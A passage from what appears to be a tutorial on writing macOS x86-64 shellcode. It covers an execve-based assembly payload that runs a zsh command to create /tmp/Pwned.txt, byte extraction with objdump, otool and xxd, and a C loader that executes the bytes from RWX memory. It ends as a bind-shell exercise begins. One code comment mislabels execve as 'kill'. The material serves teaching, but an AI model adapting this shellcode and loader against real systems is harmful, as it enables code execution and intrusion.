&#x27;-c&#x27; \t; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class=\"line\">\tpush rbx \t; push argp[1] to the stack</span><br><span class=\"line\">\tmov rbx, rsp \t; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\"></span><br><span class=\"line\">; classic position-independent trick</span><br><span class=\"line\">\tcall array ; call the array label to setup the array for argp</span><br><span class=\"line\">\tdb &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0 ; arg[2] which is our command and including the NULL Terminator</span><br></pre></td></tr></table></figure>\n\n<p>Now, We need to make <code>array</code> label where it will setup the array elements and execute the <code>execve</code> syscall and then exit.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\"></span><br><span class=\"line\">\txor rcx, rcx \t; NULL Terminator</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tmov rdx, &#x27;/bin/zsh&#x27; \t;  our file/executable name</span><br><span class=\"line\">\tpush rdx \t; push the file/executable name to the stack</span><br><span class=\"line\">\tmov rdi, rsp \t; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class=\"line\">\tmov rbx, &#x27;-c&#x27; \t; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class=\"line\">\tpush rbx \t; push argp[1] to the stack</span><br><span class=\"line\">\tmov rbx, rsp \t; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tcall array ; call the array label to setup the array for argp</span><br><span class=\"line\">\tdb &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0 ; arg[2] which is our command and including the NULL Terminator</span><br><span class=\"line\">\t</span><br><span class=\"line\">array:</span><br><span class=\"line\">\tpush rbx ; arg[1] put the -c pointer into the array</span><br><span class=\"line\">\tpush rdi ; args[0] which is fname saved before</span><br><span class=\"line\">\tmov rsi, rsp ; pass the array pointer for RSI which holds the second argument</span><br><span class=\"line\">\txor rdx, rdx ; empty rdx to use as NULL for the third argument envp</span><br><span class=\"line\">\tmov rax, 0x200003B ; The BSD syscall class entry + 0x3B (which is 59 in hex) kill syscall</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class=\"line\">\tmov rdi, 0 ; arg int rval</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>Here our shellcode, first zeroes <code>RCX</code> with <code>xor rcx, rcx</code> and <code>push rcx</code> to place an 8-byte <code>NULL</code> on the stack which will be reused as padding and as a <code>NULL</code> terminator. Next <code>mov rdx, &#39;/bin/zsh&#39;</code> loads the bytes for the <code>filename</code> into <code>RDX</code> and <code>push rdx</code> writes those 8 bytes to the stack so that <code>RSP</code> now points at the <code>&quot;/bin/zsh&quot;</code> string. <code>mov rdi, rsp</code> copies that stack pointer into <code>RDI</code>, which is the first argument to <code>execve</code> (the <code>filename</code> pointer).After that load <code>&#39;-c&#39;</code> into <code>RBX</code> and <code>push rbx</code>, creating the <code>&quot;-c&quot;</code> string on the stack; <code>mov rbx, rsp</code> saves the pointer to the <code>&quot;-c&quot;</code> string in <code>RBX</code> for later. Another <code>push rcx</code> places a <code>NULL</code> on the stack. The <code>call array</code> instruction is the classic position-independent trick, it pushes the address of the immediately following <code>db</code> bytes (the command string) onto the stack and then jumps to the <code>array</code> label, so the command string‚Äôs runtime address is already on the stack when <code>array</code> executes. The <code>db &#39;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#39;, 0</code> provides the NUL-terminated command that <code>zsh -c</code> will execute. Then, At <code>array</code>  label we will build the <code>argp</code> array by <code>push rbx</code> (push pointer to <code>&quot;-c&quot;</code>) and <code>push rdi</code> (push pointer to <code>&quot;/bin/zsh&quot;</code>), then <code>mov rsi, rsp</code> sets <code>RSI</code> to point at that array so <code>execve</code> receives <code>argp</code> correctly. Following <code>xor rdx, rdx</code> sets <code>RDX = 0</code> so <code>envp</code> is <code>NULL</code>. <code>mov rax, 0x200003B</code> loads the <code>BSD</code> syscall number for <code>execve</code>.</p>\n<blockquote>\n<p>Note: <code>0x3B</code> &#x3D; 59 decimal ‚Üí <code>execve</code></p>\n</blockquote>\n<p>And <code>syscall</code> invokes the kernel to execute <code>execve(filename, argv, envp)</code>. If <code>execve</code> returns (i.e., it failed) the code falls through to <code>mov rax, 0x2000001</code> &#x2F; <code>mov rdi, 0</code> &#x2F; <code>syscall</code> which calls the <code>exit</code> syscall to terminate the process.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 execute.asm                                                                                                          </span><br><span class=\"line\">shellcoding % ld -o execute execute.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;/Users/zeyadazima.com/shellcoding/execute.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span> /tmp</span><br><span class=\"line\">node-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog</span><br><span class=\"line\">shellcoding % ./execute                                                                                                                            </span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span> /tmp  </span><br><span class=\"line\">node-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog Pwned.txt</span><br><span class=\"line\">/tmp % <span class=\"built_in\">cat</span> Pwned.txt </span><br><span class=\"line\">W00tW00t</span><br></pre></td></tr></table></figure>\n\n<p>We can see clearly, That our shellcode is executed successfully and our file created.</p>\n<h1 id=\"Extract-Shellcode\"><a href=\"#Extract-Shellcode\" class=\"headerlink\" title=\"Extract Shellcode\"></a>Extract Shellcode</h1><p>Now, Let‚Äôs extract our shellcode from the object file, So if we need to send it with our exploit. We will use <code>objdump</code> tool and will show also how to do it with <code>otool</code>.</p>\n<h2 id=\"objdump\"><a href=\"#objdump\" class=\"headerlink\" title=\"objdump\"></a>objdump</h2>```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o</span><br><span class=\"line\"></span><br><span class=\"line\">execute.o:\tfile format mach-o 64-bit x86-64</span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section __TEXT,__text:</span><br><span class=\"line\"></span><br><span class=\"line\">0000000000000000 &lt;_main&gt;:</span><br><span class=\"line\">       0: 48 31 c9                     \txor\trcx, rcx</span><br><span class=\"line\">       3: 51                           \tpush\trcx</span><br><span class=\"line\">       4: 48 ba 2f 62 69 6e 2f 7a 73 68\tmovabs\trdx, 0x68737a2f6e69622f</span><br><span class=\"line\">       e: 52                           \tpush\trdx</span><br><span class=\"line\">       f: 48 89 e7                     \tmov\trdi, rsp</span><br><span class=\"line\">      12: bb 2d 63 00 00               \tmov\tebx, 0x632d</span><br><span class=\"line\">      17: 53                           \tpush\trbx</span><br><span class=\"line\">      18: 48 89 e3                     \tmov\trbx, rsp</span><br><span class=\"line\">      1b: 51                           \tpush\trcx</span><br><span class=\"line\">      1c: e8 21 00 00 00               \tcall\t0x42 &lt;array&gt;</span><br><span class=\"line\">      21: 65 63 68 6f                  \tmovsxd\tebp, dword ptr gs:[rax + 0x6f]</span><br><span class=\"line\">      25: 20 22                        \tand\tbyte ptr [rdx], ah</span><br><span class=\"line\">      27: 57                           \tpush\trdi</span><br><span class=\"line\">      28: 30 30                        \txor\tbyte ptr [rax], dh</span><br><span class=\"line\">      2a: 74 57                        \tje\t0x83 &lt;array+0x41&gt;</span><br><span class=\"line\">      2c: 30 30                        \txor\tbyte ptr [rax], dh</span><br><span class=\"line\">      2e: 74 22                        \tje\t0x52 &lt;array+0x10&gt;</span><br><span class=\"line\">      30: 20 3e                        \tand\tbyte ptr [rsi], bh</span><br><span class=\"line\">      32: 20 2f                        \tand\tbyte ptr [rdi], ch</span><br><span class=\"line\">      34: 74 6d                        \tje\t0xa3 &lt;array+0x61&gt;</span><br><span class=\"line\">      36: 70 2f                        \tjo\t0x67 &lt;array+0x25&gt;</span><br><span class=\"line\">      38: 50                           \tpush\trax</span><br><span class=\"line\">      39: 77 6e                        \tja\t0xa9 &lt;array+0x67&gt;</span><br><span class=\"line\">      3b: 65 64 2e 74 78               \tje\t0xb8 &lt;array+0x76&gt;</span><br><span class=\"line\">      40: 74 00                        \tje\t0x42 &lt;array&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">0000000000000042 &lt;array&gt;:</span><br><span class=\"line\">      42: 53                           \tpush\trbx</span><br><span class=\"line\">      43: 57                           \tpush\trdi</span><br><span class=\"line\">      44: 48 89 e6                     \tmov\trsi, rsp</span><br><span class=\"line\">      47: 48 31 d2                     \txor\trdx, rdx</span><br><span class=\"line\">      4a: b8 3b 00 00 02               \tmov\teax, 0x200003b</span><br><span class=\"line\">      4f: 0f 05                        \tsyscall</span><br><span class=\"line\">      51: b8 01 00 00 02               \tmov\teax, 0x2000001</span><br><span class=\"line\">      56: bf 00 00 00 00               \tmov\tedi, 0x0</span><br><span class=\"line\">      5b: 0f 05                        \tsyscall</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Here we can see our dissassembled code clearly and the array, etc. We need to save this into file</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o &gt; execute.disasm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Now, Let‚Äôs extract the hex bytes from the <code>execute.disasm</code> file. Using command line utilities.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% grep -E <span class=\"string\">&#x27;^[[:space:]]+[0-9a-f]+:&#x27;</span> execute.disasm \\</span><br><span class=\"line\">  | awk <span class=\"string\">&#x27;&#123;for(i=2;i&lt;=NF;i++) if ($i ~ /^[0-9a-f]&#123;2&#125;$/) printf &quot;%s&quot;, $i&#125;&#x27;</span> \\</span><br><span class=\"line\">  | <span class=\"built_in\">tr</span> -d <span class=\"string\">&#x27;\\n&#x27;</span> &gt; shellcode.hex</span><br><span class=\"line\">shellcoding% <span class=\"built_in\">cat</span> shellcode.hex </span><br><span class=\"line\">4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Convert it to binary</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% xxd -r -p shellcode.hex &gt; shellcode.bin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Let‚Äôs Check the Shellcode size</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% <span class=\"built_in\">wc</span> -c shellcode.bin</span><br><span class=\"line\">      93 shellcode.bin // 93 bytes</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Generate <code>C</code> array of bytes for the shellcode</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% xxd -i shellcode.bin &gt; shellcode.h</span><br><span class=\"line\">shellcoding% <span class=\"built_in\">cat</span> shellcode.h</span><br><span class=\"line\">unsigned char shellcode_bin[] = &#123;</span><br><span class=\"line\">  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,</span><br><span class=\"line\">  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,</span><br><span class=\"line\">  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,</span><br><span class=\"line\">  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,</span><br><span class=\"line\">  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,</span><br><span class=\"line\">  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,</span><br><span class=\"line\">  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,</span><br><span class=\"line\">  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">unsigned int shellcode_bin_len = 93;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"otool\"><a href=\"#otool\" class=\"headerlink\" title=\"otool\"></a>otool</h2><ul>\n<li>Extract Raw Section Bytes</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% otool -s __TEXT __text ~/shellcoding/execute.o \\</span><br><span class=\"line\">  | sed -n <span class=\"string\">&#x27;3,$p&#x27;</span> \\</span><br><span class=\"line\">  | awk <span class=\"string\">&#x27;&#123; for(i=2;i&lt;=NF;i++) printf &quot;%s&quot;,$i &#125; END&#123; print &quot;&quot; &#125;&#x27;</span> &gt; shellcode_otool.hex</span><br><span class=\"line\">shellcoding% <span class=\"built_in\">cat</span> shellcode_otool.hex </span><br><span class=\"line\">4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Convert to binary <code>xxd</code></li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% xxd -r -p shellcode_otool.hex &gt; shellcode_otool.bin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Check shellcode length</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">Shellcoding% <span class=\"built_in\">wc</span> -c shellcode_otool.bin</span><br><span class=\"line\">      93 shellcode_otool.bin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Convert it to <code>C</code> array</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">Shellcoding% <span class=\"built_in\">cat</span> shellcode_otool.h</span><br><span class=\"line\">unsigned char shellcode_otool_bin[] = &#123;</span><br><span class=\"line\">  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,</span><br><span class=\"line\">  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,</span><br><span class=\"line\">  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,</span><br><span class=\"line\">  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,</span><br><span class=\"line\">  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,</span><br><span class=\"line\">  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,</span><br><span class=\"line\">  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,</span><br><span class=\"line\">  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">unsigned int shellcode_otool_bin_len = 93;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Test-Shellcode-with-Loader\"><a href=\"#Test-Shellcode-with-Loader\" class=\"headerlink\" title=\"Test Shellcode with Loader\"></a>Test Shellcode with Loader</h2><p>Now, let‚Äôs write a loader in <code>C</code> to try and execute our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> code[] = &#123;</span><br><span class=\"line\">      <span class=\"number\">0x48</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0xc9</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0xba</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x69</span>, <span class=\"number\">0x6e</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x7a</span>,</span><br><span class=\"line\">      <span class=\"number\">0x73</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xe7</span>, <span class=\"number\">0xbb</span>, <span class=\"number\">0x2d</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x53</span>,</span><br><span class=\"line\">      <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xe3</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0xe8</span>, <span class=\"number\">0x21</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x68</span>,</span><br><span class=\"line\">      <span class=\"number\">0x6f</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x22</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x22</span>,</span><br><span class=\"line\">      <span class=\"number\">0x20</span>, <span class=\"number\">0x3e</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x6d</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x6e</span>, <span class=\"number\">0x65</span>,</span><br><span class=\"line\">      <span class=\"number\">0x64</span>, <span class=\"number\">0x2e</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xe6</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">      <span class=\"number\">0x31</span>, <span class=\"number\">0xd2</span>, <span class=\"number\">0xb8</span>, <span class=\"number\">0x3b</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0x0f</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0xb8</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">      <span class=\"number\">0x00</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0xbf</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x0f</span>, <span class=\"number\">0x05</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> len = <span class=\"keyword\">sizeof</span>(code);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">pid_t</span> pid = fork();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pid &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;fork&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pid == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// child: allocate RWX, copy shellcode and execute</span></span><br><span class=\"line\">        <span class=\"type\">void</span> *exec = mmap(<span class=\"literal\">NULL</span>, len, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class=\"line\">                          MAP_ANON|MAP_PRIVATE, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (exec == MAP_FAILED) &#123;</span><br><span class=\"line\">            perror(<span class=\"string\">&quot;mmap&quot;</span>);</span><br><span class=\"line\">            _exit(<span class=\"number\">127</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span>(exec, code, len);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// print from child so you can see it if child doesn&#x27;t get replaced</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[child %d] executing shellcode (%zu bytes)...\\n&quot;</span>, getpid(), len);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">int</span> (*func)() = (<span class=\"type\">int</span>(*)())exec;</span><br><span class=\"line\">        <span class=\"type\">int</span> r = func(); <span class=\"comment\">// if shellcode calls execve, child will be replaced</span></span><br><span class=\"line\">        <span class=\"comment\">// If returned, report and exit child</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[child %d] shellcode returned %d\\n&quot;</span>, getpid(), r);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        _exit(r &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// parent: wait for child and then check side-effect</span></span><br><span class=\"line\">        <span class=\"type\">int</span> status = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent %d] spawned child %d, waiting...\\n&quot;</span>, getpid(), pid);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (waitpid(pid, &amp;status, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">            perror(<span class=\"string\">&quot;waitpid&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (WIFEXITED(status)) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] child exited with status %d\\n&quot;</span>, WEXITSTATUS(status));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] child killed by signal %d\\n&quot;</span>, WTERMSIG(status));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] child ended with status 0x%x\\n&quot;</span>, status);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// small sleep to allow any async side-effects to settle</span></span><br><span class=\"line\">        usleep(<span class=\"number\">200000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">const</span> <span class=\"type\">char</span> *check_path = <span class=\"string\">&quot;/tmp/Pwned.txt&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (access(check_path, F_OK) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] Success: &#x27;%s&#x27; exists.\\n&quot;</span>, check_path);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] Failure: &#x27;%s&#x27; not found (errno=%d: %s)\\n&quot;</span>,</span><br><span class=\"line\">                   check_path, errno, strerror(errno));</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>The loader‚Äôs job is simple: it stores raw machine-code bytes (the shellcode) in a C <code>unsigned char</code> array, allocates a memory region with execute permission, copies the bytes into that region, casts the region pointer to a function pointer, and then calls it. That direct transfer of control is what lets the program run arbitrary machine code in the address space of the process. Because the shellcode can call <code>execve</code>, <code>_exit</code>, crash, or otherwise change the process state, the loader must be written with the understanding that control might never return to the original C runtime after the call into the shellcode. In the original single-process loader, <code>unsigned char code[] = &#123; ... &#125;;</code> places the bytes in the program‚Äôs data segment; <code>size_t len = sizeof(code);</code> computes the number of bytes to map and copy. The program then calls <code>mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)</code>. This requests an anonymous (no-file-back) memory mapping with read, write and execute permissions; <code>NULL</code> lets the kernel choose the address, <code>len</code> is the requested size, and <code>MAP_ANON|MAP_PRIVATE</code> means the mapping is private and not backed by a file. If <code>mmap</code> fails (returns <code>MAP_FAILED</code>) the loader prints the error and exits. After a successful mapping the loader uses <code>memcpy(exec, code, len)</code> to place the shellcode bytes into the mapped pages, then casts the <code>void *</code> returned by <code>mmap</code> to a function pointer (<code>int (*func)() = (int(*)())exec;</code>) and calls <code>func()</code>. Casting a data pointer to a code pointer and invoking it is implementation-defined in the C standard, but is the de‚Äëfacto technique used on <code>POSIX</code> systems for this purpose. What can happen when the call to <code>func()</code> executes depends entirely on what the shellcode does. If the shellcode is written to return cleanly it will restore registers and the stack appropriately and the loader continues execution after the call. If the shellcode invokes <code>execve()</code> successfully, the kernel replaces the entire process image with a new program, so none of the loader‚Äôs code after the call executes. If the shellcode calls <code>_exit()</code> or the process receives a fatal signal (segfault, illegal instruction), the process terminates and again no post-call statements run. Shellcode that corrupts the stack or registers without restoring them will also produce undefined behavior in the loader when control returns. In short: seeing only the pre-exec print usually means the shellcode either replaced or terminated the process or crashed it before your post-exec prints could run. A forked-loader variant is useful because it isolates the untrusted shellcode in a child process while the parent remains alive to observe results. When the program <code>fork()</code>, the child repeats the mapping, copy and invocation of the shellcode; any <code>execve</code> or <code>_exit</code> inside the child affects only the child. The parent calls <code>waitpid(child, &amp;status, 0)</code> to get the child‚Äôs exit status and can report whether the child exited normally, was killed by a signal, or returned a particular code. The parent can also check for side-effects such as files written by the child (for example <code>/tmp/Pwned.txt</code>) and print reliable diagnostics. This pattern is ideal for debugging shellcode that tends to replace or terminate its host process ‚Äî the parent becomes the stable observer.</p>\n<ul>\n<li>Compile and Test the shellcode with the loader</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">zeyadazima.com% clang -o cloader cloader.c</span><br><span class=\"line\">zeyadazima.com% ./cloader </span><br><span class=\"line\">[parent <span class=\"number\">29373</span>] spawned child <span class=\"number\">29374</span>, waiting...</span><br><span class=\"line\">[child <span class=\"number\">29374</span>] executing <span class=\"title function_\">shellcode</span> <span class=\"params\">(<span class=\"number\">93</span> bytes)</span>...</span><br><span class=\"line\">[parent] child exited with status 0</span><br><span class=\"line\">[parent] Success: &#x27;/tmp/Pwned.txt&#x27; exists.</span><br></pre></td></tr></table></figure>\n\n<p>As we can see our shellcode executed successfully with no issues.</p>\n<h1 id=\"Exercises\"><a href=\"#Exercises\" class=\"headerlink\" title=\"Exercises\"></a>Exercises</h1><p>If you want to dive deeper more, you can do this exercise which is involving in creating a <code>BindShell</code> shellcode and execute it. </p>\n<p>Here all the things you need for the excersice:</p>\n<ul>\n<li>BindShell <code>C</code> code</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Source - https://stackoverflow.com/q</span></span><br><span class=\"line\"><span class=\"comment\">// Posted by 